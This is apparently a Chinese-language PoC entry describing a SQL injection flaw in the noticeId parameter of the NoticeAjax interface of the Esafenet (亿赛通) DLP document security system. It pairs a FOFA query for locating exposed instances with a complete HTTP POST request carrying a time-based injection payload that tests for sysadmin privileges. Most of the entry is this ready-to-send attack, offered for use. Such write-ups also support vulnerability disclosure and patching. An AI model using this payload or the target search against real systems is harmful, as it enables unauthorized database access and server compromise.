# 亿赛通电子文档安全管理系统NoticeAjax接口存在SQL注入漏洞

亿某通电子文档安全管理系统` NoticeAjax`接口的`noticeId`参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限

## fofa

```yaml
app="亿赛通-DLP"
```

## poc

```yaml
POST /CDGServer3/NoticeAjax;Service HTTP/1.1
Host: ip:8443
Cookie: JSESSIONID=A7058CC5796E5F433F2CC668C7B7B77D; JSESSIONID=0E09F2450421C51339E5657425612536
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close
Content-Length: 98
Content-Type: application/x-www-form-urlencoded

command=delNotice&noticeId=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--
```

![image-20240718165542392](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407181655455.png)